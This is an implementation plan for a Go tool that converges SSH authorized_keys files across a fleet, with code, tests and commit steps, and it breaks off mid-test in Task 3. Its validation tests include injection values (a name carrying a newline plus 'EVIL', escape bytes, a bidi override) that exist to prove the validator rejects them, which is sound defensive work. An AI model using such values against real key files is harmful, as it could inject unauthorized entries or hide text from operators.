# Apply Slice Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement `sshepherd apply` — the first write path: render each server's desired `authorized_keys` from the manifest and converge the fleet byte-exactly, behind a plan → confirm → atomic-write → verify pipeline with a self-lockout guard.

**Architecture:** Shared SSH glue is extracted from `sshread` into a new `internal/sshconn` (connection, quoting, capped buffers, session-key recorder); `internal/authkeys` gains a renderer whose output our own parser must round-trip; `internal/audit` retains raw bytes and accepts a server subset; a new `internal/sshwrite` runs the remote pre-check/backup/write/verify protocol over one connection; a new `internal/apply` holds the pure plan computation, guard, phase-2 orchestration (behind a `Writer` seam), and report; `cmd/sshepherd` wires flags, preflights, the confirmation gate, and exit codes.

**Tech Stack:** Go 1.26, `golang.org/x/crypto/ssh` (+`agent`, `knownhosts`), `golang.org/x/term` (TTY detection), Cobra, table-driven tests + golden files (`-update`), native fuzzing, dockerized-sshd integration harness (`scripts/integration.sh`).

**Spec (binding):** `docs/superpowers/specs/2026-07-19-apply-slice-design.md` — approved 2026-07-19. Commit 1 (the spec) is done; this plan is commits 2–11 as Tasks 1–10. Work on `master` (trunk-based), each commit green on its own.

---

## File structure

| Package / file | Responsibility |
|---|---|
| `internal/authkeys/authkeys.go` | +`RenderTextIssue` (Task 1) — the shared "safe to render & re-read" predicate |
| `internal/config/config.go` | Task 1: name/comment validation via `RenderTextIssue` |
| `internal/sshconn/` (new) | Task 2: `ShQuote`, `PathAssign`, `AuthorizedKeysCmdFor`, `interpretExit`, `FinishRead`, `SanitizeRemote`, `SanitizedError`, `CappedBuffer`, `hostKeyHint`, `Dialer`/`Conn`/`Connect`, `Exec`. Task 4: session-key recorder, `AgentFingerprints` |
| `internal/sshread/` | Shrinks to read decision logic; public API (`Client`, `CheckAgent`, `PreflightKnownHosts`) unchanged, internals delegate |
| `internal/authkeys/render.go` (new) | Task 3: `ManagedHeader`, `RenderEntry`, `RenderLine`, `Render` + `FuzzRenderRoundTrip` |
| `internal/audit/audit.go` | Task 5: `ReadResult.SessionKeyFP`, `ServerResult.Content`/`.SessionKeyFP`, `Options.Servers` |
| `internal/sshwrite/` (new) | Task 6: `precheckCmdFor`/`writeCmdFor` builders, `SymlinkError`, `FleetWriter.Apply` (pre-check+backup → atomic write → verify over one connection) |
| `internal/apply/` (new) | Task 7: `Build` (plan + guard, pure), `Execute` (phase-2 fan-out behind `Writer`), `Render`/`RenderSummary`/`ExitCode` |
| `cmd/sshepherd/apply.go` (new) | Task 8: flags, preflights + agent fingerprint capture, confirmation gate, exit mapping |
| `internal/sshwrite/integration_test.go`, `cmd/sshepherd/e2e_test.go`, `scripts/integration.sh` | Task 9: real-sshd write tests + full E2E loop |
| `CLAUDE.md`, spec status line, roadmap memory | Task 10 |

## Conventions for every task

- **Gate** (run before every commit; referred to below as "the gate"):
  ```bash
  gofmt -l .            # must print nothing
  go vet ./...
  golangci-lint run
  go test -race ./...
  ```
  Full `make check` additionally runs `deadcode ./cmd/sshepherd`, which fails between Tasks 3 and 7 because new exported surface (`authkeys.Render`, `sshconn.AgentFingerprints`, all of `sshwrite`/`apply`) is only reachable from `main` once Task 8 lands. Run full `make check` at Tasks 1, 2, 8, 9, 10; the four-command gate elsewhere.
- Test keys always come from `internal/testkeys` (`testkeys.Line(t, seed)`), like every existing test.
- Golden files: regenerate with `go test <pkg> -update`, then **read the diff** before committing. An unexpected golden diff is a failing test with extra steps.
- Every new package gets a `leak_test.go`:
  ```go
  package <name>

  import (
  	"testing"

  	"go.uber.org/goleak"
  )

  func TestMain(m *testing.M) {
  	goleak.VerifyTestMain(m)
  }
  ```
- Commit messages end with the `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>` trailer (use `git commit -m "$(cat <<'EOF' ... EOF)"` or `-m` with a literal newline block as shown in each commit step).

---

### Task 1: `feat(config)` — harden name/comment validation for the render invariant

The render invariant is "one entry, one line, re-parses identically". Today only `comment:` and key lines reject `\r\n`; `name` — the `DesiredComment` floor — accepts anything YAML can quote, including newlines, and an untrimmed `comment:` could never verify as written (`ssh.ParseAuthorizedKey` trims comments on re-read). The shared predicate lives in `authkeys` (it is a property of the authorized_keys line format), so Task 3's fuzz target and config validation can never drift apart.

**Files:**
- Modify: `internal/authkeys/authkeys.go` (add `RenderTextIssue` after `stripControl`)
- Modify: `internal/config/config.go` (`validateUsers`)
- Test: `internal/authkeys/authkeys_test.go`, `internal/config/config_test.go`

- [ ] **Step 1.1: Write the failing authkeys test**

Append to `internal/authkeys/authkeys_test.go`:

```go
func TestRenderTextIssue(t *testing.T) {
	tests := []struct{ name, in, want string }{
		{"empty is safe (means unset)", "", ""},
		{"plain", "alice@work", ""},
		{"internal spaces ok", "alice laptop key", ""},
		{"newline", "a\nb", "contains control or format characters"},
		{"carriage return", "a\rb", "contains control or format characters"},
		{"tab", "a\tb", "contains control or format characters"},
		{"escape byte", "a\x1b[31mb", "contains control or format characters"},
		{"C1 CSI", "a\u009bb", "contains control or format characters"},
		{"bidi override (Cf)", "user\u202eevil", "contains control or format characters"},
		{"leading space", " a", "has leading or trailing whitespace"},
		{"trailing space", "a ", "has leading or trailing whitespace"},
		{"all whitespace", "   ", "has leading or trailing whitespace"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := RenderTextIssue(tt.in); got != tt.want {
				t.Errorf("RenderTextIssue(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}
```

- [ ] **Step 1.2: Write the failing config tests**

In `internal/config/config_test.go`, in the `TestParseInvalid` table:

(a) Change the existing `"comment with line break"` row's `wantErr` from `"comment contains a line break"` to `"comment contains control or format characters"`.

(b) Add these rows right after it:

```go
		{"name with newline", `
users:
  - {name: "x\nEVIL", keys: ["KEYA"]}
`, "name contains control or format characters"},
		{"name with escape byte", `
users:
  - {name: "x\u001B[31m", keys: ["KEYA"]}
`, "name contains control or format characters"},
		{"name with bidi override", `
users:
  - {name: "x\u202Evil", keys: ["KEYA"]}
`, "name contains control or format characters"},
		{"name with trailing space", `
users:
  - {name: "alice ", keys: ["KEYA"]}
`, "name has leading or trailing whitespace"},
		{"comment with control char", `
users:
  - {name: alice, comment: "a\u0007b", keys: ["KEYA"]}
`, "comment contains control or format characters"},
		{"comment untrimmed", `
users:
  - {name: alice, comment: " alice@work", keys: ["KEYA"]}
`, "comment has leading or trailing whitespace"},
		{"comment all whitespace", `
users:
  - {name: alice, comment: "   ", keys: ["KEYA"]}
`, "comment has leading or trailing whitespace"},
```

- [ ] **Step 1.3: Run tests to verify they fail**

Run: `go test ./internal/authkeys/ -run TestRenderTextIssue -v && go test ./internal/config/ -run TestParseInvalid -v`
Expected: authkeys FAILS to compile (`undefined: RenderTextIssue`); config FAILS on the changed row (old message) and the new rows (values currently accepted or wrong message).

- [ ] **Step 1.4: Implement**

(a) In `internal/authkeys/authkeys.go`, add after `stripControl`:

```go
// RenderTextIssue reports why s is unsafe to render into an authorized_keys
// line and read back identically; empty means safe (and the empty string is
// safe — it means "unset"). Control and format runes would split the
// one-entry-one-line invariant or smuggle terminal escapes; edge whitespace
// would not survive ssh.ParseAuthorizedKey's comment trimming on re-read,
// making the written file permanently disagree with the manifest. config
// validation applies this to every rendered field (user names, comments) at
// manifest load, so hostile values die before the render path ever runs.
func RenderTextIssue(s string) string {
	for _, r := range s {
		if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) {
			return "contains control or format characters"
		}
	}
	if strings.TrimSpace(s) != s {
		return "has leading or trailing whitespace"
	}
	return ""
}
```

(b) In `internal/config/config.go` `validateUsers`, replace:

```go
		if strings.ContainsAny(u.Comment, "\r\n") {
			errs = append(errs, fmt.Errorf("user %q: comment contains a line break", u.Name))
		}
```

with:

```go
		if issue := authkeys.RenderTextIssue(u.Name); issue != "" {
			// name is both an identifier and the comment of last resort
			// (DesiredComment's floor): a hostile name would inject content
			// into every rendered authorized_keys file.
			errs = append(errs, fmt.Errorf("user %q: name %s", u.Name, issue))
		}
		if issue := authkeys.RenderTextIssue(u.Comment); issue != "" {
			errs = append(errs, fmt.Errorf("user %q: comment %s", u.Name, issue))
		}
```

- [ ] **Step 1.5: Run the package tests**

Run: `go test ./internal/authkeys/ ./internal/config/ -v`
Expected: PASS, including every pre-existing test (names like `alice`, `javad-work` and comments like `alice@sshepherd` all pass the new rules).

- [ ] **Step 1.6: Full gate**

Run: `make check`
Expected: all green (`RenderTextIssue` is reachable from main via config validation).

- [ ] **Step 1.7: Commit**

```bash
git add internal/authkeys/authkeys.go internal/authkeys/authkeys_test.go internal/config/config.go internal/config/config_test.go
git commit -m "$(cat <<'EOF'
feat(config): harden name/comment validation for the render invariant

names and comments now reject control/format runes and edge whitespace via
the shared authkeys.RenderTextIssue predicate, so "a render can never emit
an extra line, and re-reads identically" is enforced at manifest load.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 2: `refactor(sshconn)` — extract shared SSH connection glue from sshread

Behavior-preserving. The spec's package table enumerates exactly what moves: `shQuote`, the `~/`→`"${HOME:?}"` assignment builder (extracted as `PathAssign`), `authorizedKeysCmdFor`, `interpretExit`, `finishRead`, `sanitizeRemote` + `sanitizedError`, `cappedBuffer`, `hostKeyHint`/`typeRecorded`/`recordedTypes`, and the connect sequence (agent dial, knownhosts callback, dial, handshake, deadline plumbing). `readRemote`'s session glue generalizes into `sshconn.Exec` (gains a `stdin` parameter — nil on the read path — so Task 6's writer can share it). `sshread` keeps `Client`/`CheckAgent`/`PreflightKnownHosts` with unchanged signatures and call sites; tests of moved helpers move with them.

**Files:**
- Create: `internal/sshconn/sshconn.go`, `internal/sshconn/hostkey.go`, `internal/sshconn/connect.go`
- Create: `internal/sshconn/sshconn_test.go`, `internal/sshconn/fuzz_test.go`, `internal/sshconn/leak_test.go`
- Rewrite: `internal/sshread/sshread.go` (delegating), `internal/sshread/sshread_test.go` (moved tests removed)
- Delete: `internal/sshread/fuzz_test.go` (moves)
- Modify: `Makefile` (FuzzShQuote path)

- [ ] **Step 2.1: Create `internal/sshconn/sshconn.go`**

```go
// Package sshconn holds the SSH connection glue and remote-command plumbing
// shared by the read path (sshread) and the write path (sshwrite): POSIX
// quoting, remote command builders, capped output buffers, sanitization of
// remote-controlled text, and the agent-auth/strict-known_hosts connect
// sequence. Extracted verbatim from sshread (2026-07-19 apply spec) so a fix
// to this security-sensitive code can never land in only one copy.
package sshconn

import (
	"bytes"
	"fmt"
	"log/slog"
	"strings"
	"unicode"

	"github.com/javadh75/SSHepherd/internal/audit"
)

// DefaultAuthorizedKeysPath is the file read (and written) when a server
// sets no authorized_keys_file override in the manifest.
const DefaultAuthorizedKeysPath = "~/.ssh/authorized_keys"

// FileAbsentExit is the sentinel exit status emitted by the command that
// AuthorizedKeysCmdFor builds, signaling "file does not exist" (vs. cat
// failing for other reasons). sshwrite's symlink sentinel 45 is its sibling.
const FileAbsentExit = 44

// MaxRemoteOutput caps how much remote stdout/stderr is buffered (1 MiB).
// authorized_keys files are tiny; anything larger is hostile or broken.
const MaxRemoteOutput = 1 << 20
```

Then move these from `internal/sshread/sshread.go`, verbatim except the listed renames:

- `shQuote` → exported `ShQuote` (doc comment: replace the two `TestShQuote`/`FuzzShQuote` references verbatim — they move to this package).
- The assignment half of `authorizedKeysCmdFor` becomes its own builder, and the read command composes it:

```go
// PathAssign builds the `p=<path>` shell assignment every remote command
// starts with. The caller-controlled path enters exactly once, as a
// ShQuote-d token — config validation has already rejected control and
// format characters, and the quoting renders everything else inert (defense
// in depth). "~/" paths become "${HOME:?}"/<rest>: tilde expansion inside an
// assignment next to quoted text is a dash/ash portability footgun, and if
// HOME were ever unset remotely, ${HOME:?} fails the command loudly (a
// normal remote error) instead of silently touching a wrong path.
func PathAssign(path string) string {
	if rest, ok := strings.CutPrefix(path, "~/"); ok {
		return `p="${HOME:?}"/` + ShQuote(rest)
	}
	return "p=" + ShQuote(path)
}

// AuthorizedKeysCmdFor builds the remote command that reads path, exiting
// with the FileAbsentExit sentinel when the file does not exist. The default
// and override cases share this one code path; sshwrite's verify step reads
// back through this exact command.
func AuthorizedKeysCmdFor(path string) string {
	return PathAssign(path) + `; if [ -e "$p" ]; then cat "$p"; else exit 44; fi`
}
```

- `interpretExit` — stays unexported (only `FinishRead` calls it); body verbatim, `fileAbsentExit` → `FileAbsentExit`.
- `sanitizeRemote` → exported `SanitizeRemote` (sshwrite embeds remote stderr in errors too); doc comment verbatim.
- `sanitizedError` → exported:

```go
// SanitizedError control-strips the wrapped error's message while preserving
// the errors.Is/As chain. Both the read and write paths wrap their returned
// errors in it: handshake and remote-command errors can embed
// server-supplied text, which must never reach an operator's terminal raw.
type SanitizedError struct{ Err error }

func (e SanitizedError) Error() string { return SanitizeRemote(e.Err.Error()) }
func (e SanitizedError) Unwrap() error { return e.Err }
```

- `cappedBuffer` → exported `CappedBuffer` with the same fields (unexported) plus a constructor; `Write`/`String`/`Bytes` verbatim, plus `Len`:

```go
// NewCappedBuffer returns a buffer that keeps at most limit bytes.
func NewCappedBuffer(limit int) *CappedBuffer { return &CappedBuffer{limit: limit} }

// Len reports the retained byte count.
func (b *CappedBuffer) Len() int { return b.buf.Len() }
```

- `finishRead` → exported `FinishRead(code int, stdout, stderr *CappedBuffer, addr string, log *slog.Logger) (audit.ReadResult, error)`; body verbatim except `maxRemoteOutput` → `MaxRemoteOutput` and `stdout.buf.Len()` → `stdout.Len()`.

- [ ] **Step 2.2: Create `internal/sshconn/hostkey.go`**

Move `hostKeyHint`, `typeRecorded`, `recordedTypes` verbatim from `sshread.go` (they stay unexported — only `Connect` calls them; their tests live in this package now). Imports: `errors`, `fmt`, `strings`, `golang.org/x/crypto/ssh`, `golang.org/x/crypto/ssh/knownhosts`, `internal/config`.

- [ ] **Step 2.3: Create `internal/sshconn/connect.go`**

```go
package sshconn

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/crypto/ssh/knownhosts"

	"github.com/javadh75/SSHepherd/internal/config"
)

// Dialer holds the per-fleet connection settings shared by every server
// connection, read and write paths alike.
type Dialer struct {
	KnownHostsPath string
	AgentSock      string
	DialTimeout    time.Duration
	Log            *slog.Logger // optional stage-level telemetry; nil discards
}

// log returns the configured logger or a discard logger, so call sites never
// nil-check.
func (d *Dialer) log() *slog.Logger {
	if d.Log != nil {
		return d.Log
	}
	return slog.New(slog.DiscardHandler)
}

// Conn is an authenticated SSH connection to one server.
type Conn struct {
	Client *ssh.Client
}

// Close is nil-safe so test fakes can hand out a bare Conn.
func (c *Conn) Close() error {
	if c.Client == nil {
		return nil
	}
	if err := c.Client.Close(); err != nil {
		return fmt.Errorf("close ssh connection: %w", err)
	}
	return nil
}

// Connect dials srv and completes an agent-authenticated handshake under
// strict known_hosts verification (moved verbatim from sshread; the security
// posture — agent-only auth, no TOFU — is unchanged). The ctx deadline
// bounds agent I/O, dial, and handshake, and is installed as the socket
// deadline, so it keeps bounding whatever sessions the caller runs on the
// returned connection. Callers without a ctx deadline get a hard floor:
// 3×DialTimeout (30s when DialTimeout is zero). The agent connection lives
// only until Connect returns — signing happens during auth, never after.
func (d *Dialer) Connect(ctx context.Context, srv config.Server) (*Conn, error) {
	if _, ok := ctx.Deadline(); !ok {
		fallback := 3 * d.DialTimeout
		if fallback <= 0 {
			fallback = 30 * time.Second
		}
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, fallback)
		defer cancel()
	}
	dl, _ := ctx.Deadline() // always present: the floor above guarantees it
	log := d.log()

	agentDialer := net.Dialer{}
	agentConn, err := agentDialer.DialContext(ctx, "unix", d.AgentSock)
	if err != nil {
		return nil, fmt.Errorf("connect ssh-agent: %w", err)
	}
	defer func() { _ = agentConn.Close() }() // errcheck: auth is complete (or failed) by return; close error uninteresting
	_ = agentConn.SetDeadline(dl)            // ag.Signers does I/O mid-handshake; a wedged agent must not hang a worker
	ag := agent.NewClient(agentConn)

	hostKeys, err := knownhosts.New(d.KnownHostsPath)
	if err != nil {
		return nil, fmt.Errorf("load known_hosts %s: %w", d.KnownHostsPath, err)
	}
	// Wrap the strict callback so verification failures carry the key the
	// server actually presented — hostKeyHint needs it to tell a changed key
	// apart from an unrecorded key type.
	cb := func(hostname string, remote net.Addr, key ssh.PublicKey) error {
		if khErr := hostKeys(hostname, remote, key); khErr != nil {
			return hostKeyHint(khErr, key, srv, d.KnownHostsPath)
		}
		log.Debug("host key verified", "server", srv.Name)
		return nil
	}

	addr := net.JoinHostPort(srv.Host, strconv.Itoa(srv.Port))
	dialer := net.Dialer{Timeout: d.DialTimeout}
	log.Debug("dialing", "server", srv.Name, "addr", addr)
	dialStart := time.Now()
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", addr, err)
	}
	log.Debug("dial ok", "server", srv.Name, "addr", addr,
		"dur", time.Since(dialStart).Round(time.Millisecond))
	_ = conn.SetDeadline(dl) // bounds handshake + all later session I/O, not just dial

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
		User:            srv.User,
		Auth:            []ssh.AuthMethod{ssh.PublicKeysCallback(ag.Signers)},
		HostKeyCallback: cb,
	})
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("ssh %s@%s: %w", srv.User, addr, err)
	}
	log.Debug("auth ok", "server", srv.Name, "user", srv.User)
	return &Conn{Client: ssh.NewClient(sshConn, chans, reqs)}, nil
}

// Exec runs cmd in one session over client, optionally feeding stdin, and
// returns the remote exit code with capped stdout/stderr. A nonzero exit is
// data, not an error — sentinel exits (44 file-absent, sshwrite's 45
// symlink) are protocol semantics only the caller can interpret. err is
// non-nil only for transport-level failures (session open, channel I/O).
func Exec(client *ssh.Client, cmd string, stdin io.Reader) (code int, stdout, stderr *CappedBuffer, err error) {
	sess, err := client.NewSession()
	if err != nil {
		return 0, nil, nil, fmt.Errorf("open session: %w", err)
	}
	defer func() { _ = sess.Close() }()

	stdout = NewCappedBuffer(MaxRemoteOutput)
	stderr = NewCappedBuffer(MaxRemoteOutput)
	sess.Stdin = stdin
	sess.Stdout = stdout
	sess.Stderr = stderr

	if runErr := sess.Run(cmd); runErr != nil {
		var exitErr *ssh.ExitError
		if !errors.As(runErr, &exitErr) {
			return 0, nil, nil, fmt.Errorf("run remote command: %w", runErr)
		}
		code = exitErr.ExitStatus()
	}
	return code, stdout, stderr, nil
}
```

- [ ] **Step 2.4: Move the tests**

Create `internal/sshconn/sshconn_test.go` (`package sshconn`) and **move these tests verbatim** from `internal/sshread/sshread_test.go`, applying only these mechanical renames (`shQuote`→`ShQuote`, `authorizedKeysCmdFor`→`AuthorizedKeysCmdFor`, `defaultAuthorizedKeysPath`→`DefaultAuthorizedKeysPath`, `fileAbsentExit`→`FileAbsentExit`, `sanitizeRemote`→`SanitizeRemote`, `sanitizedError{...}`→`SanitizedError{Err: ...}` (two literals), `finishRead`→`FinishRead`, `&cappedBuffer{limit: N}`→`NewCappedBuffer(N)` — the direct field reads `b.truncated`/`exact.truncated` stay, same package):

- `TestInterpretExit`, `TestShQuote`, `TestAuthorizedKeysCmdFor`, `TestDefaultCmdBehavesLikeOldConst`, `TestHostKeyHint` (plus its `ed25519Key` and `ecdsaKey` helpers), `TestCappedBuffer`, `TestSanitizedError`, `TestSanitizeRemote`, `TestFinishRead`.

Imports for the new file: `bytes`, `context`, `crypto/ecdsa`, `crypto/elliptic`, `crypto/rand`, `errors`, `log/slog`, `net`, `os`, `os/exec`, `path/filepath`, `strings`, `testing`, `golang.org/x/crypto/ssh`, `golang.org/x/crypto/ssh/knownhosts`, `internal/clog`, `internal/config`, `internal/testkeys`.

Append one new test for the extracted builder:

```go
func TestPathAssign(t *testing.T) {
	tests := []struct{ name, path, want string }{
		{"absolute", "/etc/keys", `p='/etc/keys'`},
		{"home-relative", "~/.ssh/authorized_keys", `p="${HOME:?}"/'.ssh/authorized_keys'`},
		{"home-relative with quote", "~/o'brien", `p="${HOME:?}"/'o'\''brien'`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := PathAssign(tt.path); got != tt.want {
				t.Errorf("PathAssign(%q) = %s, want %s", tt.path, got, tt.want)
			}
		})
	}
}
```

Move `internal/sshread/fuzz_test.go` to `internal/sshconn/fuzz_test.go` (`package sshconn`; `shQuote`→`ShQuote`, three occurrences), delete the original, and create `internal/sshconn/leak_test.go` per the convention block above.

- [ ] **Step 2.5: Rewrite `internal/sshread/sshread.go`**

Replace the whole file with:

```go
// Package sshread is the real KeyReader: it connects to a server over SSH
// (agent auth, strict known_hosts) and reads the remote authorized_keys.
// The connection glue lives in internal/sshconn (shared with the write
// path); this package keeps the read decision logic and its public API.
package sshread

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh/agent"
	"golang.org/x/crypto/ssh/knownhosts"

	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
)

// PreflightKnownHosts verifies the known_hosts file loads before any server
// is dialed, so a bad path fails once with a clear message instead of once
// per server. It keeps the knownhosts dependency inside this package.
func PreflightKnownHosts(path string) error {
	if _, err := knownhosts.New(path); err != nil {
		return fmt.Errorf("load known_hosts %s: %w", path, err)
	}
	return nil
}

// CheckAgent verifies a usable SSH agent — reachable and holding at least
// one key — before any server is dialed, so a missing or empty agent fails
// once with a clear message instead of once per server with a cryptic
// "no supported methods remain" auth error. ctx cancellation aborts the
// dial; the 3s timeout still bounds a wedged agent on its own.
func CheckAgent(ctx context.Context, sock string) error {
	if sock == "" {
		return errors.New("no SSH agent: SSH_AUTH_SOCK is not set (start ssh-agent and ssh-add a key)")
	}
	dialer := net.Dialer{Timeout: 3 * time.Second}
	conn, err := dialer.DialContext(ctx, "unix", sock)
	if err != nil {
		return fmt.Errorf("SSH agent unreachable at %s: %w", sock, err)
	}
	defer func() { _ = conn.Close() }()                   // errcheck: close error is uninteresting on a preflight
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second)) // a wedged agent must not hang the preflight
	keys, err := agent.NewClient(conn).List()
	if err != nil {
		return fmt.Errorf("SSH agent at %s is not answering (is it an SSH agent?): %w", sock, err)
	}
	if len(keys) == 0 {
		return fmt.Errorf("SSH agent at %s has no keys loaded (run ssh-add to load your key)", sock)
	}
	return nil
}

// Client reads remote authorized_keys over SSH. It implements audit.KeyReader.
type Client struct {
	KnownHostsPath string
	AgentSock      string
	DialTimeout    time.Duration
	Log            *slog.Logger // optional stage-level telemetry; nil discards
}

var _ audit.KeyReader = (*Client)(nil)

// log returns the configured logger or a discard logger, so call sites never
// nil-check.
func (c *Client) log() *slog.Logger {
	if c.Log != nil {
		return c.Log
	}
	return slog.New(slog.DiscardHandler)
}

// ReadAuthorizedKeys connects to srv and reads its authorized_keys via
// readAuthorizedKeys, wrapping any error so its message is control-stripped:
// handshake errors can embed server-supplied text (disconnect messages,
// algorithm names), which must never reach an operator's terminal raw.
func (c *Client) ReadAuthorizedKeys(ctx context.Context, srv config.Server) (audit.ReadResult, error) {
	res, err := c.readAuthorizedKeys(ctx, srv)
	if err != nil {
		return res, sshconn.SanitizedError{Err: err}
	}
	return res, nil
}

// readAuthorizedKeys connects through sshconn.Dialer and reads the server's
// authorized_keys — srv.AuthorizedKeysFile when set, ~/.ssh/authorized_keys
// otherwise — via a one-shot session. Deadline semantics live in Connect:
// the ctx deadline (or the derived 3×DialTimeout floor) bounds the whole
// exchange, not just the dial.
func (c *Client) readAuthorizedKeys(ctx context.Context, srv config.Server) (audit.ReadResult, error) {
	var zero audit.ReadResult
	d := &sshconn.Dialer{
		KnownHostsPath: c.KnownHostsPath,
		AgentSock:      c.AgentSock,
		DialTimeout:    c.DialTimeout,
		Log:            c.Log,
	}
	conn, err := d.Connect(ctx, srv)
	if err != nil {
		return zero, err
	}
	defer func() { _ = conn.Close() }()

	path := srv.AuthorizedKeysFile
	if path == "" {
		path = sshconn.DefaultAuthorizedKeysPath
	}
	addr := net.JoinHostPort(srv.Host, strconv.Itoa(srv.Port))
	code, stdout, stderr, err := sshconn.Exec(conn.Client, sshconn.AuthorizedKeysCmdFor(path), nil)
	if err != nil {
		return zero, fmt.Errorf("remote read on %s: %w", addr, err)
	}
	c.log().Debug("remote read done", "addr", addr, "exit", code)
	return sshconn.FinishRead(code, stdout, stderr, addr, c.log())
}
```

- [ ] **Step 2.6: Prune `internal/sshread/sshread_test.go`**

Delete the moved tests and now-unused helpers (`ed25519Key`, `ecdsaKey`) and imports; **keep**: `TestCheckAgent`, `serveAgent`, `shortTempDir`, `TestClientBadAgentSock`, `TestClientBadKnownHostsPath`, `TestClientDeadline`, `startFakeAgent`, `connHolder`/`newConnHolder`, `TestClientLogNilSafe`. Remaining imports: `context`, `crypto/ed25519`, `crypto/rand`, `errors`, `net`, `os`, `path/filepath`, `strings`, `sync`, `testing`, `time`, `golang.org/x/crypto/ssh/agent`, `internal/config`. (`internal/sshread/integration_test.go` is untouched — `Client` kept its API.)

- [ ] **Step 2.7: Update the Makefile fuzz target**

Change the FuzzShQuote line to:

```make
	$(GO) test -run='^$$' -fuzz=FuzzShQuote -fuzztime=15s ./internal/sshconn
```

- [ ] **Step 2.8: Run the moved and remaining tests**

Run: `go test ./internal/sshconn/ ./internal/sshread/ -v`
Expected: PASS — every moved test green in its new home, every kept test green.

Run: `go test -run='^$' -fuzz=FuzzShQuote -fuzztime=5s ./internal/sshconn`
Expected: fuzzing runs and finds nothing.

- [ ] **Step 2.9: Full gate**

Run: `make check`
Expected: all green — everything in sshconn is reachable from main through sshread's delegation.

- [ ] **Step 2.10: Commit**

```bash
git add internal/sshconn/ internal/sshread/ Makefile
git commit -m "$(cat <<'EOF'
refactor(sshconn): extract shared SSH connection glue from sshread

Behavior-preserving: ShQuote/PathAssign/AuthorizedKeysCmdFor, capped
buffers, sanitization, host-key hints, and the connect sequence move as
units with their tests (incl. FuzzShQuote); readRemote generalizes into
sshconn.Exec (stdin-capable) for the upcoming write path. sshread keeps
its public API and delegates.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 3: `feat(authkeys)` — render authorized_keys lines (+ round-trip fuzz)

Pure renderer per the spec's *Rendering* section: options comma-joined verbatim, key material re-marshaled to one canonical form (immune to odd whitespace in manifest lines; certificates round-trip like any other type), comment appended, file = managed header + one line per key + trailing newline. `authkeys` cannot import `config`, so the comment arrives resolved as a string.

Note one deliberate signature deviation from the spec's shorthand `Render(entries) []byte`: `Render` and `RenderLine` return an error for a `Key` whose `Raw` does not re-parse (only possible for a hand-built Key — silently dropping a key would be a lockout hazard, and panicking is not this codebase's style). For any Key produced by `ParseLine` the error is impossible; `apply` treats it as a tool bug (exit 3).

**Files:**
- Create: `internal/authkeys/render.go`
- Test: `internal/authkeys/render_test.go`, append to `internal/authkeys/fuzz_test.go`
- Create (via `-update`): `internal/authkeys/testdata/render_basic.golden`
- Modify: `Makefile` (add FuzzRenderRoundTrip)

- [ ] **Step 3.1: Write the failing tests**

Create `internal/authkeys/render_test.go`:

```go
package authkeys

import (
	"bytes"
	"flag"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/testkeys"
)

var update = flag.Bool("update", false, "rewrite golden files")

func checkGolden(t *testing.T, name string, got []byte) {
	t.Helper()
	path := filepath.Join("testdata", name)
	if *update {
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatalf("update golden: %v", err)
		}
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read golden (run with -update first): %v", err)
	}
	if !bytes.Equal(got, want) {
		t.Errorf("output differs from %s:\n--- got ---\n%s\n--- want ---\n%s", path, got, want)
	}
}

// mustKey parses line or fails the test.
func mustKey(t *testing.T, line string) Key {
	t.Helper()
	k, err := ParseLine(line)
	if err != nil || k == nil {
		t.Fatalf("mustKey(%q): %v", line, err)
	}
	return *k
}

func TestRenderLine(t *testing.T) {
	base := testkeys.Line(t, 1)
	tests := []struct {
		name  string
		line  string // parsed into the entry's Key
		comm  string
		want  string
	}{
		{"plain with comment", base, "alice@work", base + " alice@work"},
		{"no comment", base, "", base},
		{"inline comment on source line is not the rendered comment",
			base + " old@host", "new@host", base + " new@host"},
		{"options preserved verbatim",
			"no-pty,no-agent-forwarding " + base, "a", "no-pty,no-agent-forwarding " + base + " a"},
		{"quoted option with comma and space survives the join",
			`command="echo a,b c",restrict ` + base, "x", `command="echo a,b c",restrict ` + base + " x"},
		{"odd whitespace in the source normalizes to canonical form",
			"   " + base + "   ", "c", base + " c"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := RenderLine(RenderEntry{Key: mustKey(t, tt.line), Comment: tt.comm})
			if err != nil {
				t.Fatalf("RenderLine: %v", err)
			}
			if got != tt.want {
				t.Errorf("RenderLine = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestRenderLineRejectsHandBuiltKey(t *testing.T) {
	// A Key not produced by ParseLine must surface as an error, never a
	// silently dropped (= lockout hazard) or garbage line.
	if _, err := RenderLine(RenderEntry{Key: Key{Raw: "not a key"}, Comment: "c"}); err == nil {
		t.Fatal("RenderLine(garbage Raw) = nil error, want error")
	}
}

func TestRenderGolden(t *testing.T) {
	entries := []RenderEntry{
		{Key: mustKey(t, testkeys.Line(t, 1)), Comment: "op@sshepherd"},
